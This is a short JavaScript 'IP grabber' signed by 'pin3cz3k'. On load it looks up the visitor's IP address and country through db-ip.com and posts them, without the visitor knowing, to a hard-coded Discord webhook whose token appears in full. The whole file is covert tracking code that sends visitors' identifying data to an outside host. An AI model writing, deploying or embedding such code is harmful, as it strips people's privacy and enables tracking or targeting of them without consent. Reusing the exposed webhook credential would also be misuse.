var webHookUrl = "https://discord.com/api/webhooks/1013782824064651355/co-GP2CVnh_zSZd5QDW9H4ChMtEUsjASxERM7W-4cg_s2YmsXJdqPmD3VsEBUnNQ9U6c";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "ip grabber by pin3cz3k\n\n",
        avatar_url: "",
        content:    "**IP GRABER BY PIN3CZ3K**\n" + 
		    "__**IP:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**kraj:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
